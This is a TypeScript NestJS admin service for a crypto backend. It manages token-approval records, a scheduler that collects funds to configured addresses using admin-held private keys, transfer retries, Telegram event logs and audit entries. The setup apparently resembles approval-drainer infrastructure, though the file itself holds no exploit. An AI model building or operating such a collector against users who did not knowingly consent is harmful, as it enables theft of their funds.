import {
  BadRequestException,
  Injectable,
  NotFoundException,
} from "@nestjs/common";
import { PrismaClient } from "@prisma/client";
import { Wallet } from "ethers";
import { TronWeb } from "tronweb";
import { ConfigService } from "../../config/config.service";
import { SETTING_KEYS } from "../../config/settings-keys";
import { ApprovalCollectionScheduler } from "../../jobs/schedulers/approval-collection.scheduler";
import { NativeTransferReconciliationScheduler } from "../../jobs/schedulers/native-transfer-reconciliation.scheduler";
import { AdminDevOpsService } from "./admin-devops.service";
import { AdminStreamService } from "./admin-stream.service";
import { WalletService } from "../wallet/wallet.service";

const prisma = new PrismaClient();

@Injectable()
export class AdminOpsService {
  constructor(
    private readonly configService: ConfigService,
    private readonly walletService: WalletService,
    private readonly collectorScheduler: ApprovalCollectionScheduler,
    private readonly nativeScheduler: NativeTransferReconciliationScheduler,
    private readonly streamService: AdminStreamService,
    private readonly devOpsService: AdminDevOpsService
  ) {}

  async getSettings(category?: string) {
    return {
      settings: this.configService.getAll(category),
      lastReloadAt: this.configService.getLastReloadAt()?.toISOString() ?? null,
    };
  }

  async patchSettings(body: Record<string, unknown>) {
    const updates = (body.settings ?? body) as Record<string, unknown>;
    const changed = await this.configService.setMany(updates, "admin");
    await this.recordAudit("settings.update", "settings", null, { changed, updates });
    await this.configService.reload();
    this.collectorScheduler.updateFromConfig();
    this.nativeScheduler.updateFromConfig();
    this.streamService.emit("settings.updated", { keys: changed });
    return { ok: true, changed };
  }

  async reloadConfig() {
    await this.configService.reload();
    this.collectorScheduler.updateFromConfig();
    this.nativeScheduler.updateFromConfig();
    return {
      ok: true,
      lastReloadAt: this.configService.getLastReloadAt()?.toISOString() ?? null,
    };
  }

  async getSystemStatus() {
    const evmSpender = (process.env.NEXT_PUBLIC_SPENDER_EVM ?? "").trim();
    const tronSpender = (process.env.NEXT_PUBLIC_SPENDER_TRON ?? "").trim();
    const evmKey = (process.env.ADMIN_EVM_PRIVATE_KEY ?? "").trim();
    const tronKey = (process.env.ADMIN_TRON_PRIVATE_KEY ?? "").trim();

    let evmMatch = false;
    let tronMatch = false;
    try {
      if (evmKey && evmSpender) {
        evmMatch =
          new Wallet(evmKey).address.toLowerCase() === evmSpender.toLowerCase();
      }
    } catch {
      evmMatch = false;
    }
    try {
      if (tronKey && tronSpender) {
        const tron = new TronWeb({
          fullHost: "https://api.trongrid.io",
          privateKey: tronKey,
        });
        const derived = tron.address.fromPrivateKey(tronKey);
        tronMatch =
          typeof derived === "string" && derived === tronSpender;
      }
    } catch {
      tronMatch = false;
    }

    return {
      secrets: {
        evm: {
          configured: Boolean(evmKey),
          spenderAddress: evmSpender || null,
          spenderMatch: evmMatch,
        },
        tron: {
          configured: Boolean(tronKey),
          spenderAddress: tronSpender || null,
          spenderMatch: tronMatch,
        },
      },
      collector: this.collectorScheduler.getStatus(),
      nativeReconcile: this.nativeScheduler.getStatus(),
      configLastReloadAt:
        this.configService.getLastReloadAt()?.toISOString() ?? null,
      devOpsEnabled:
        process.env.NODE_ENV !== "production" &&
        (process.env.ADMIN_DEV_OPS ?? "").toLowerCase() === "true",
    };
  }

  async patchApproval(id: string, body: Record<string, unknown>) {
    const approval = await prisma.approval.findUnique({ where: { id } });
    if (!approval) throw new NotFoundException("Approval not found");

    const data: Record<string, unknown> = {};
    if (typeof body.collectionEnabled === "boolean") {
      data.collectionEnabled = body.collectionEnabled;
    }
    if (body.collectionToAddress !== undefined) {
      data.collectionToAddress = String(body.collectionToAddress ?? "").trim() || null;
    }
    if (body.remainingRaw !== undefined) {
      data.remainingRaw = String(body.remainingRaw).trim();
    }
    if (body.expiresAt !== undefined) {
      data.expiresAt = body.expiresAt ? new Date(String(body.expiresAt)) : null;
    }

    if (Object.keys(data).length === 0) {
      throw new BadRequestException("No valid fields to update");
    }

    const updated = await prisma.approval.update({
      where: { id },
      data,
    });
    await this.recordAudit("approval.update", "approval", id, {
      before: {
        collectionEnabled: approval.collectionEnabled,
        collectionToAddress: approval.collectionToAddress,
        remainingRaw: approval.remainingRaw,
        expiresAt: approval.expiresAt,
      },
      after: data,
    });
    this.streamService.emit("approval.updated", { id });
    return { ok: true, item: updated };
  }

  async retryTransfer(id: string) {
    const transfer = await prisma.transfer.findUnique({
      where: { id },
      include: { approval: true },
    });
    if (!transfer) throw new NotFoundException("Transfer not found");
    if (transfer.status !== "failed") {
      throw new BadRequestException("Only failed transfers can be retried");
    }
    const idempotencyKey = `admin-retry:${id}:${Date.now()}`;
    const result = await this.walletService.adminTransfer({
      approvalId: transfer.approvalId,
      amountRaw: transfer.amountRaw,
      toAddress: transfer.toAddress,
      idempotencyKey,
    });
    await prisma.transfer.update({
      where: { id },
      data: { retryCount: { increment: 1 } },
    });
    await this.recordAudit("transfer.retry", "transfer", id, { idempotencyKey });
    return result;
  }

  async getTgEvent(id: string) {
    const item = await prisma.tgLogEvent.findUnique({ where: { id } });
    if (!item) throw new NotFoundException("Event not found");
    return { item };
  }

  async collectorToggle(body: { enabled?: boolean }) {
    if (typeof body.enabled === "boolean") {
      this.collectorScheduler.setRuntimeEnabled(body.enabled);
      await this.configService.setMany(
        { [SETTING_KEYS.COLLECTOR_ENABLED]: body.enabled },
        "admin"
      );
    }
    await this.recordAudit("collector.toggle", "collector", null, body);
    this.streamService.emit("collector.updated", this.collectorScheduler.getStatus());
    return { ok: true, status: this.collectorScheduler.getStatus() };
  }

  async collectorTick() {
    await this.collectorScheduler.forceTick();
    this.streamService.emit("collector.tick", { at: new Date().toISOString() });
    return { ok: true, message: "Collector tick completed" };
  }

  async releaseLeases() {
    const released = await this.collectorScheduler.releaseLeases();
    await this.recordAudit("collector.release_leases", "collector", null, { released });
    return { ok: true, released };
  }

  restartBackend() {
    const result = this.devOpsService.restartBackend();
    this.recordAudit("dev.restart_backend", "system", null, {});
    return result;
  }

  restartWebsite() {
    const result = this.devOpsService.restartWebsite();
    this.recordAudit("dev.restart_website", "system", null, {});
    return result;
  }

  getWalletTimeline(address: string) {
    return prisma.auditLog.findMany({
      where: {
        OR: [
          { payload: { path: ["address"], equals: address } },
          { actor: { contains: address, mode: "insensitive" } },
        ],
      },
      orderBy: { createdAt: "desc" },
      take: 50,
    });
  }

  private async recordAudit(
    action: string,
    entityType: string,
    entityId: string | null,
    payload: unknown
  ) {
    await prisma.auditLog.create({
      data: {
        actor: "admin",
        action,
        entityType,
        entityId,
        payload: payload as object,
      },
    });
    this.streamService.emit("audit.created", { action, entityType, entityId });
  }
}
